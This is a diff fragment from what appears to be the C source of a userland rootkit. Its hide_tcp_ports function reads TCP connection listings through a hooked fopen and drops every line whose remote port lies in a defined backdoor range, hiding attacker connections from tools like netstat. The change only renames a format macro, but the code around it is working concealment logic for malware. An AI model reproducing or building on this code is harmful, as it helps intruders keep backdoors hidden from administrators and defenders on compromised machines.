@@ -39,9 +39,9 @@ FILE                *hide_tcp_ports(const char *file) {
     FILE            *pnt = REAL_FOPEN(file, "r");
 
     while (fgets(line, LINE_MAX, pnt)) {
-        sscanf(line, SCANF_FMT, &d, local_addr, &local_port, rem_addr, &rem_port,
-                &state, &txq, &rxq, &timer_run, &time_len, &retr, &uid,
-                &timeout, &inode, more);
+        sscanf(line, SCANF_PROC_NET_TCP, &d, local_addr, &local_port,
+                rem_addr, &rem_port, &state, &txq, &rxq, &timer_run,
+                &time_len, &retr, &uid, &timeout, &inode, more);
         if (rem_port >= LOW_BACKDOOR_PORT && rem_port <= HIGH_BACKDOOR_PORT)
             continue;
         fputs(line, tmp);
